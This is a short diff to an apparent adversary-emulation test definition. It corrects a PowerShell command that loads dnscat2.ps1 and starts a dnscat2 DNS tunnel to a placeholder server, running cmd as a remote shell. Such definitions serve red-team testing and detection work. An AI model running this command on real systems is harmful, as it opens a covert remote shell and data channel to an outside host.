@@ -706,7 +706,7 @@
       psh:
         command: |
           import-module #{file_path}\\dnscat2.ps1
-          Start-Dnscat2 -Domain #{dnscat2_server} Exec cmd
+          Start-Dnscat2 -Domain #{dnscat2_server} -Exec cmd
         payloads: 
         - dnscat2.ps1
 
